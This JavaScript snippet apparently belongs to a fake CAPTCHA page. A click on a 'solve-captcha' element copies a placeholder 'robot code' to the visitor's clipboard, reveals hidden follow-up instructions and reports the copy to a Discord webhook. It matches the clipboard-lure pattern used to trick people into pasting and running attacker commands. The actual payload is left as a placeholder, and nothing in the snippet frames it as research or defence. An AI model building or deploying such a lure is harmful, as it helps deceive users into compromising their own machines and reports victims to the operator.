document.getElementById('solve-captcha').addEventListener('click', () => {
    const code = 'your-robot-code-here'; // Replace with the actual code
    navigator.clipboard.writeText(code).then(() => {
        document.getElementById('additional-instruction').style.display = 'block';
        sendToDiscordWebhook(code);
    });
});

function sendToDiscordWebhook(code) {
    const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
    const data = {
        content: `Code copied to clipboard: \`${code}\``
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    }).then(data => {
        console.log('Success:', data);
    }).catch(error => {
        console.error('Error:', error);
    });
}
